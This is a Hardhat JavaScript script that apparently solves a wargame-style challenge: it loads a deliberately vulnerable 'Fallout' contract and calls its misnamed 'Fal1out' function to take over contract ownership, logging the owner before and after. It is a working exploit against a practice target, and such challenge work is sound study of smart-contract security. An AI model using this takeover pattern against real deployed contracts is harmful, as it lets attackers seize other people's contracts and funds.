const { getNamedAccounts, ethers, network } = require("hardhat")
const {
    developmentChains,
    networkConfig,
    STANDARD_FEE_VALUE,
} = require("../helper-hardhat-config")

/**
 * The objective is to sucessfully call the Fal1out function
 * so that we are the new owners of the contract.
 */

async function performHack() {
    const { deployer, player } = await getNamedAccounts()
    console.log("-------------------------------------")
    console.log("Retrieving vulnerable contract and hacker address...")
    let vulnerableContract, hacker
    const chainId = network.config.chainId
    if (developmentChains.includes(network.name)) {
        hacker = player
        vulnerableContract = await ethers.getContract("Fallout", hacker)
    } else {
        hacker = deployer
        vulnerableContract = await ethers.getContractAt(
            "Fallout",
            networkConfig[chainId]["falloutContractAddress"],
            hacker
        )
    }
    console.log("Done!")
    console.log("-------------------------------------")
    console.log("Showing initial information...")
    await showInitialInformation(vulnerableContract)
    console.log("-------------------------------------")
    console.log("Step 1: Calling the Fal1out function...")
    await callFal1outFunction(vulnerableContract)
    console.log("-------------------------------------")
}

async function showInitialInformation(vulnerableContract) {
    console.log(`Contract owner is ${await vulnerableContract.owner()}`)
    console.log(`Hacker is ${await vulnerableContract.signer.address}`)
}

async function callFal1outFunction(vulnerableContract) {
    const fal1outTx = await vulnerableContract.Fal1out()
    await fal1outTx.wait(1)
    console.log(`Contract owner is now ${await vulnerableContract.owner()}`)
}

performHack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
